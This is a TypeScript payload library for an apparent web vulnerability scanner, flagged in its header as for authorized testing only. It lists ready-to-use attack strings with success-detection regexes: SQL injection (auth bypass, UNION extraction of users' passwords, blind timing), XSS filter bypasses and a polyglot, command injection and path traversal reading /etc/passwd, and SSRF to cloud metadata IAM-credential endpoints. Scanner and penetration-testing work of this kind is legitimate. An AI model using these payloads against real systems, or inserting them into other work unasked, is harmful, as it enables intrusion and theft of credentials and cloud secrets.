/**
 * Payload Database for Advanced Web Vulnerability Testing
 *
 * Contains payloads for:
 * - SQL Injection (SQLi)
 * - Cross-Site Scripting (XSS)
 * - Command Injection
 * - Path Traversal
 * - Server-Side Request Forgery (SSRF)
 *
 * IMPORTANT: These payloads are for AUTHORIZED security testing only.
 * Unauthorized use against systems you don't own is illegal.
 */

export type PayloadType = 'sqli' | 'xss' | 'cmd_injection' | 'path_traversal' | 'ssrf';
export type RiskLevel = 'critical' | 'high' | 'medium' | 'low';

export interface Payload {
  id: string;
  type: PayloadType;
  payload: string;
  description: string;
  detectionPatterns: RegExp[];
  riskLevel: RiskLevel;
  category?: string; // Sub-category (e.g., 'union-based', 'reflected')
  context?: string; // Where this payload should be used (e.g., 'parameter', 'header')
}

export class PayloadDatabase {
  /**
   * Get SQL Injection payloads (20+ variants)
   */
  getSQLiPayloads(): Payload[] {
    return [
      // Classic SQL Injection
      {
        id: 'sqli-classic-1',
        type: 'sqli',
        payload: "' OR '1'='1",
        description: 'Classic OR-based SQL injection',
        detectionPatterns: [
          /SQL syntax.*?error/i,
          /mysql_fetch_array\(\)/i,
          /Warning.*?mysql_/i,
          /valid MySQL result/i,
          /MySqlClient\./i,
        ],
        riskLevel: 'critical',
        category: 'classic',
      },
      {
        id: 'sqli-classic-2',
        type: 'sqli',
        payload: "' OR '1'='1'--",
        description: 'SQL injection with comment terminator',
        detectionPatterns: [/SQL syntax.*?error/i, /mysql/i],
        riskLevel: 'critical',
        category: 'classic',
      },
      {
        id: 'sqli-classic-3',
        type: 'sqli',
        payload: "admin'--",
        description: 'Admin bypass with comment',
        detectionPatterns: [/SQL syntax.*?error/i],
        riskLevel: 'critical',
        category: 'auth-bypass',
      },
      {
        id: 'sqli-classic-4',
        type: 'sqli',
        payload: "1' OR 1=1#",
        description: 'MySQL hash comment injection',
        detectionPatterns: [/SQL syntax.*?error/i, /mysql/i],
        riskLevel: 'critical',
        category: 'classic',
      },
      // Union-based SQL Injection
      {
        id: 'sqli-union-1',
        type: 'sqli',
        payload: "1' UNION SELECT NULL--",
        description: 'Union-based column enumeration',
        detectionPatterns: [/SQL syntax.*?error/i, /UNION/i],
        riskLevel: 'critical',
        category: 'union-based',
      },
      {
        id: 'sqli-union-2',
        type: 'sqli',
        payload: "1' UNION SELECT NULL,NULL--",
        description: 'Union-based 2 column enumeration',
        detectionPatterns: [/SQL syntax.*?error/i],
        riskLevel: 'critical',
        category: 'union-based',
      },
      {
        id: 'sqli-union-3',
        type: 'sqli',
        payload: "' UNION SELECT username,password FROM users--",
        description: 'Union-based credential extraction attempt',
        detectionPatterns: [/SQL syntax.*?error/i, /column/i],
        riskLevel: 'critical',
        category: 'union-based',
      },
      // Error-based SQL Injection
      {
        id: 'sqli-error-1',
        type: 'sqli',
        payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        description: 'MySQL error-based version extraction',
        detectionPatterns: [/XPATH syntax error/i, /extractvalue/i],
        riskLevel: 'critical',
        category: 'error-based',
      },
      {
        id: 'sqli-error-2',
        type: 'sqli',
        payload: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
        description: 'MySQL error-based with double query',
        detectionPatterns: [/Duplicate entry/i, /for key/i],
        riskLevel: 'critical',
        category: 'error-based',
      },
      // Time-based Blind SQL Injection
      {
        id: 'sqli-time-1',
        type: 'sqli',
        payload: "' AND SLEEP(5)--",
        description: 'MySQL time-based blind injection (5 second delay)',
        detectionPatterns: [], // Detection is based on response time
        riskLevel: 'high',
        category: 'time-based',
      },
      {
        id: 'sqli-time-2',
        type: 'sqli',
        payload: "'; WAITFOR DELAY '0:0:5'--",
        description: 'MSSQL time-based blind injection',
        detectionPatterns: [],
        riskLevel: 'high',
        category: 'time-based',
      },
      {
        id: 'sqli-time-3',
        type: 'sqli',
        payload: "' AND pg_sleep(5)--",
        description: 'PostgreSQL time-based blind injection',
        detectionPatterns: [],
        riskLevel: 'high',
        category: 'time-based',
      },
      // Boolean-based Blind SQL Injection
      {
        id: 'sqli-bool-1',
        type: 'sqli',
        payload: "' AND 1=1--",
        description: 'Boolean-based true condition',
        detectionPatterns: [],
        riskLevel: 'high',
        category: 'boolean-based',
      },
      {
        id: 'sqli-bool-2',
        type: 'sqli',
        payload: "' AND 1=2--",
        description: 'Boolean-based false condition',
        detectionPatterns: [],
        riskLevel: 'high',
        category: 'boolean-based',
      },
      // Database-specific payloads
      {
        id: 'sqli-pgsql-1',
        type: 'sqli',
        payload: "'; SELECT version();--",
        description: 'PostgreSQL version detection',
        detectionPatterns: [/PostgreSQL/i, /ERROR/i],
        riskLevel: 'critical',
        category: 'postgresql',
      },
      {
        id: 'sqli-mssql-1',
        type: 'sqli',
        payload: "'; SELECT @@version;--",
        description: 'MSSQL version detection',
        detectionPatterns: [/Microsoft SQL Server/i, /msg/i],
        riskLevel: 'critical',
        category: 'mssql',
      },
      {
        id: 'sqli-oracle-1',
        type: 'sqli',
        payload: "' UNION SELECT NULL FROM DUAL--",
        description: 'Oracle DUAL table detection',
        detectionPatterns: [/ORA-/i, /Oracle/i],
        riskLevel: 'critical',
        category: 'oracle',
      },
      // NoSQL Injection
      {
        id: 'sqli-nosql-1',
        type: 'sqli',
        payload: '{"$gt":""}',
        description: 'MongoDB NoSQL injection',
        detectionPatterns: [/MongoError/i, /\$gt/i],
        riskLevel: 'critical',
        category: 'nosql',
      },
      {
        id: 'sqli-nosql-2',
        type: 'sqli',
        payload: "' || '1'=='1",
        description: 'NoSQL OR injection',
        detectionPatterns: [],
        riskLevel: 'high',
        category: 'nosql',
      },
    ];
  }

  /**
   * Get XSS payloads (15+ variants)
   */
  getXSSPayloads(): Payload[] {
    return [
      // Basic XSS
      {
        id: 'xss-basic-1',
        type: 'xss',
        payload: '<script>alert("XSS")</script>',
        description: 'Basic script tag XSS',
        detectionPatterns: [/<script>alert/i],
        riskLevel: 'high',
        category: 'reflected',
      },
      {
        id: 'xss-basic-2',
        type: 'xss',
        payload: '<script>alert(document.domain)</script>',
        description: 'Domain disclosure XSS',
        detectionPatterns: [/<script>alert\(document/i],
        riskLevel: 'high',
        category: 'reflected',
      },
      // Event handler XSS
      {
        id: 'xss-event-1',
        type: 'xss',
        payload: '<img src=x onerror=alert(1)>',
        description: 'IMG onerror event XSS',
        detectionPatterns: [/<img[^>]+onerror/i],
        riskLevel: 'high',
        category: 'event-handler',
      },
      {
        id: 'xss-event-2',
        type: 'xss',
        payload: '<body onload=alert(1)>',
        description: 'Body onload event XSS',
        detectionPatterns: [/<body[^>]+onload/i],
        riskLevel: 'high',
        category: 'event-handler',
      },
      {
        id: 'xss-event-3',
        type: 'xss',
        payload: '<svg onload=alert(1)>',
        description: 'SVG onload event XSS',
        detectionPatterns: [/<svg[^>]+onload/i],
        riskLevel: 'high',
        category: 'event-handler',
      },
      {
        id: 'xss-event-4',
        type: 'xss',
        payload: '<input onfocus=alert(1) autofocus>',
        description: 'Input autofocus event XSS',
        detectionPatterns: [/<input[^>]+onfocus/i],
        riskLevel: 'high',
        category: 'event-handler',
      },
      // Encoded/Obfuscated XSS (filter bypass)
      {
        id: 'xss-encoded-1',
        type: 'xss',
        payload: '<script>alert(String.fromCharCode(88,83,83))</script>',
        description: 'CharCode encoded XSS',
        detectionPatterns: [/fromCharCode/i],
        riskLevel: 'high',
        category: 'filter-bypass',
      },
      {
        id: 'xss-encoded-2',
        type: 'xss',
        payload: '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">',
        description: 'HTML entity encoded XSS',
        detectionPatterns: [/&#\d+;/],
        riskLevel: 'high',
        category: 'filter-bypass',
      },
      {
        id: 'xss-encoded-3',
        type: 'xss',
        payload: '<script>eval(atob("YWxlcnQoMSk="))</script>',
        description: 'Base64 encoded XSS',
        detectionPatterns: [/atob\(/i, /eval\(/i],
        riskLevel: 'high',
        category: 'filter-bypass',
      },
      // Case variation XSS
      {
        id: 'xss-case-1',
        type: 'xss',
        payload: '<ScRiPt>alert(1)</ScRiPt>',
        description: 'Mixed case script tag',
        detectionPatterns: [/<script>/i],
        riskLevel: 'high',
        category: 'filter-bypass',
      },
      // Polyglot XSS
      {
        id: 'xss-polyglot-1',
        type: 'xss',
        payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        description: 'XSS Polyglot payload',
        detectionPatterns: [/javascript:/i, /oNloAd/i, /alert/i],
        riskLevel: 'high',
        category: 'polyglot',
      },
      // DOM-based XSS
      {
        id: 'xss-dom-1',
        type: 'xss',
        payload: '#<script>alert(1)</script>',
        description: 'DOM-based XSS via hash',
        detectionPatterns: [],
        riskLevel: 'high',
        category: 'dom-based',
      },
      {
        id: 'xss-dom-2',
        type: 'xss',
        payload: 'javascript:alert(document.cookie)',
        description: 'JavaScript URI XSS',
        detectionPatterns: [/javascript:/i],
        riskLevel: 'high',
        category: 'dom-based',
      },
      // Attribute injection XSS
      {
        id: 'xss-attr-1',
        type: 'xss',
        payload: '" onmouseover="alert(1)',
        description: 'Attribute escape XSS',
        detectionPatterns: [/onmouseover/i],
        riskLevel: 'high',
        category: 'attribute',
      },
      {
        id: 'xss-attr-2',
        type: 'xss',
        payload: "' onclick='alert(1)'",
        description: 'Single quote attribute XSS',
        detectionPatterns: [/onclick/i],
        riskLevel: 'high',
        category: 'attribute',
      },
    ];
  }

  /**
   * Get Command Injection payloads (10+ variants)
   */
  getCommandInjectionPayloads(): Payload[] {
    return [
      // Unix command injection
      {
        id: 'cmd-unix-1',
        type: 'cmd_injection',
        payload: '; ls -la',
        description: 'Unix semicolon command separator',
        detectionPatterns: [/total \d+/, /drwx/, /rwx/],
        riskLevel: 'critical',
        category: 'unix',
      },
      {
        id: 'cmd-unix-2',
        type: 'cmd_injection',
        payload: '| cat /etc/passwd',
        description: 'Unix pipe to read passwd',
        detectionPatterns: [/root:/, /bin\/bash/, /nologin/],
        riskLevel: 'critical',
        category: 'unix',
      },
      {
        id: 'cmd-unix-3',
        type: 'cmd_injection',
        payload: '`id`',
        description: 'Unix backtick command execution',
        detectionPatterns: [/uid=\d+/, /gid=\d+/],
        riskLevel: 'critical',
        category: 'unix',
      },
      {
        id: 'cmd-unix-4',
        type: 'cmd_injection',
        payload: '$(whoami)',
        description: 'Unix command substitution',
        detectionPatterns: [],
        riskLevel: 'critical',
        category: 'unix',
      },
      {
        id: 'cmd-unix-5',
        type: 'cmd_injection',
        payload: '&& id',
        description: 'Unix AND operator injection',
        detectionPatterns: [/uid=\d+/],
        riskLevel: 'critical',
        category: 'unix',
      },
      {
        id: 'cmd-unix-6',
        type: 'cmd_injection',
        payload: '|| id',
        description: 'Unix OR operator injection',
        detectionPatterns: [/uid=\d+/],
        riskLevel: 'critical',
        category: 'unix',
      },
      // Windows command injection
      {
        id: 'cmd-win-1',
        type: 'cmd_injection',
        payload: '& dir',
        description: 'Windows command separator',
        detectionPatterns: [/Directory of/, /Volume in drive/],
        riskLevel: 'critical',
        category: 'windows',
      },
      {
        id: 'cmd-win-2',
        type: 'cmd_injection',
        payload: '| type %SYSTEMROOT%\\win.ini',
        description: 'Windows pipe read win.ini',
        detectionPatterns: [/\[fonts\]/, /\[extensions\]/i],
        riskLevel: 'critical',
        category: 'windows',
      },
      {
        id: 'cmd-win-3',
        type: 'cmd_injection',
        payload: '& whoami',
        description: 'Windows whoami injection',
        detectionPatterns: [/\\/, /authority/i],
        riskLevel: 'critical',
        category: 'windows',
      },
      // Filter bypass command injection
      {
        id: 'cmd-bypass-1',
        type: 'cmd_injection',
        payload: ";{cat,/etc/passwd}",
        description: 'Brace expansion bypass',
        detectionPatterns: [/root:/],
        riskLevel: 'critical',
        category: 'bypass',
      },
      {
        id: 'cmd-bypass-2',
        type: 'cmd_injection',
        payload: ";cat${IFS}/etc/passwd",
        description: 'IFS variable bypass',
        detectionPatterns: [/root:/],
        riskLevel: 'critical',
        category: 'bypass',
      },
    ];
  }

  /**
   * Get Path Traversal payloads (10+ variants)
   */
  getPathTraversalPayloads(): Payload[] {
    return [
      // Basic path traversal
      {
        id: 'path-basic-1',
        type: 'path_traversal',
        payload: '../../../etc/passwd',
        description: 'Basic Unix path traversal',
        detectionPatterns: [/root:/, /bin\/bash/, /nologin/],
        riskLevel: 'high',
        category: 'unix',
      },
      {
        id: 'path-basic-2',
        type: 'path_traversal',
        payload: '..\\..\\..\\windows\\win.ini',
        description: 'Basic Windows path traversal',
        detectionPatterns: [/\[fonts\]/, /\[extensions\]/i],
        riskLevel: 'high',
        category: 'windows',
      },
      // Encoded path traversal
      {
        id: 'path-encoded-1',
        type: 'path_traversal',
        payload: '..%2f..%2f..%2fetc%2fpasswd',
        description: 'URL encoded path traversal',
        detectionPatterns: [/root:/],
        riskLevel: 'high',
        category: 'encoded',
      },
      {
        id: 'path-encoded-2',
        type: 'path_traversal',
        payload: '..%252f..%252f..%252fetc%252fpasswd',
        description: 'Double URL encoded traversal',
        detectionPatterns: [/root:/],
        riskLevel: 'high',
        category: 'encoded',
      },
      {
        id: 'path-encoded-3',
        type: 'path_traversal',
        payload: '....//....//....//etc/passwd',
        description: 'Dot-dot-slash bypass',
        detectionPatterns: [/root:/],
        riskLevel: 'high',
        category: 'bypass',
      },
      // Null byte path traversal
      {
        id: 'path-null-1',
        type: 'path_traversal',
        payload: '../../../etc/passwd%00.png',
        description: 'Null byte extension bypass',
        detectionPatterns: [/root:/],
        riskLevel: 'high',
        category: 'null-byte',
      },
      // Absolute path
      {
        id: 'path-absolute-1',
        type: 'path_traversal',
        payload: '/etc/passwd',
        description: 'Absolute path traversal',
        detectionPatterns: [/root:/],
        riskLevel: 'high',
        category: 'absolute',
      },
      {
        id: 'path-absolute-2',
        type: 'path_traversal',
        payload: 'C:\\windows\\win.ini',
        description: 'Windows absolute path',
        detectionPatterns: [/\[fonts\]/i],
        riskLevel: 'high',
        category: 'absolute',
      },
      // Web root traversal
      {
        id: 'path-webroot-1',
        type: 'path_traversal',
        payload: '/var/www/html/../../../etc/passwd',
        description: 'Web root traversal',
        detectionPatterns: [/root:/],
        riskLevel: 'high',
        category: 'webroot',
      },
      // Unicode/UTF-8 bypass
      {
        id: 'path-unicode-1',
        type: 'path_traversal',
        payload: '..%c0%af..%c0%af..%c0%afetc/passwd',
        description: 'Unicode slash bypass',
        detectionPatterns: [/root:/],
        riskLevel: 'high',
        category: 'unicode',
      },
    ];
  }

  /**
   * Get SSRF payloads (10+ variants)
   */
  getSSRFPayloads(): Payload[] {
    return [
      // Basic SSRF
      {
        id: 'ssrf-basic-1',
        type: 'ssrf',
        payload: 'http://localhost',
        description: 'Localhost SSRF',
        detectionPatterns: [],
        riskLevel: 'high',
        category: 'basic',
      },
      {
        id: 'ssrf-basic-2',
        type: 'ssrf',
        payload: 'http://127.0.0.1',
        description: '127.0.0.1 SSRF',
        detectionPatterns: [],
        riskLevel: 'high',
        category: 'basic',
      },
      {
        id: 'ssrf-basic-3',
        type: 'ssrf',
        payload: 'http://[::1]',
        description: 'IPv6 localhost SSRF',
        detectionPatterns: [],
        riskLevel: 'high',
        category: 'basic',
      },
      // Cloud metadata SSRF
      {
        id: 'ssrf-aws-1',
        type: 'ssrf',
        payload: 'http://169.254.169.254/latest/meta-data/',
        description: 'AWS metadata endpoint',
        detectionPatterns: [/ami-id/, /instance-id/, /security-credentials/i],
        riskLevel: 'critical',
        category: 'cloud-metadata',
      },
      {
        id: 'ssrf-aws-2',
        type: 'ssrf',
        payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        description: 'AWS IAM credentials endpoint',
        detectionPatterns: [/AccessKeyId/, /SecretAccessKey/i],
        riskLevel: 'critical',
        category: 'cloud-metadata',
      },
      {
        id: 'ssrf-gcp-1',
        type: 'ssrf',
        payload: 'http://metadata.google.internal/computeMetadata/v1/',
        description: 'GCP metadata endpoint',
        detectionPatterns: [/project/, /attributes/],
        riskLevel: 'critical',
        category: 'cloud-metadata',
      },
      {
        id: 'ssrf-azure-1',
        type: 'ssrf',
        payload: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        description: 'Azure metadata endpoint',
        detectionPatterns: [/compute/, /network/],
        riskLevel: 'critical',
        category: 'cloud-metadata',
      },
      // Internal network SSRF
      {
        id: 'ssrf-internal-1',
        type: 'ssrf',
        payload: 'http://192.168.1.1',
        description: 'Internal network scan (192.168.1.1)',
        detectionPatterns: [],
        riskLevel: 'medium',
        category: 'internal',
      },
      {
        id: 'ssrf-internal-2',
        type: 'ssrf',
        payload: 'http://10.0.0.1',
        description: 'Internal network scan (10.0.0.1)',
        detectionPatterns: [],
        riskLevel: 'medium',
        category: 'internal',
      },
      // Protocol handler SSRF
      {
        id: 'ssrf-file-1',
        type: 'ssrf',
        payload: 'file:///etc/passwd',
        description: 'File protocol SSRF',
        detectionPatterns: [/root:/],
        riskLevel: 'high',
        category: 'protocol',
      },
      {
        id: 'ssrf-dict-1',
        type: 'ssrf',
        payload: 'dict://localhost:6379/INFO',
        description: 'Dict protocol Redis SSRF',
        detectionPatterns: [/redis_version/],
        riskLevel: 'high',
        category: 'protocol',
      },
      // Bypass techniques
      {
        id: 'ssrf-bypass-1',
        type: 'ssrf',
        payload: 'http://0.0.0.0',
        description: '0.0.0.0 SSRF bypass',
        detectionPatterns: [],
        riskLevel: 'high',
        category: 'bypass',
      },
      {
        id: 'ssrf-bypass-2',
        type: 'ssrf',
        payload: 'http://localhost.localdomain',
        description: 'localhost.localdomain bypass',
        detectionPatterns: [],
        riskLevel: 'high',
        category: 'bypass',
      },
    ];
  }

  /**
   * Get all payloads of a specific type
   */
  getPayloadsByType(type: PayloadType): Payload[] {
    switch (type) {
      case 'sqli':
        return this.getSQLiPayloads();
      case 'xss':
        return this.getXSSPayloads();
      case 'cmd_injection':
        return this.getCommandInjectionPayloads();
      case 'path_traversal':
        return this.getPathTraversalPayloads();
      case 'ssrf':
        return this.getSSRFPayloads();
      default:
        return [];
    }
  }

  /**
   * Get all payloads
   */
  getAllPayloads(): Payload[] {
    return [
      ...this.getSQLiPayloads(),
      ...this.getXSSPayloads(),
      ...this.getCommandInjectionPayloads(),
      ...this.getPathTraversalPayloads(),
      ...this.getSSRFPayloads(),
    ];
  }

  /**
   * Get payloads by category
   */
  getPayloadsByCategory(type: PayloadType, category: string): Payload[] {
    return this.getPayloadsByType(type).filter(p => p.category === category);
  }

  /**
   * Get payload count summary
   */
  getPayloadSummary(): Record<PayloadType, number> {
    return {
      sqli: this.getSQLiPayloads().length,
      xss: this.getXSSPayloads().length,
      cmd_injection: this.getCommandInjectionPayloads().length,
      path_traversal: this.getPathTraversalPayloads().length,
      ssrf: this.getSSRFPayloads().length,
    };
  }
}
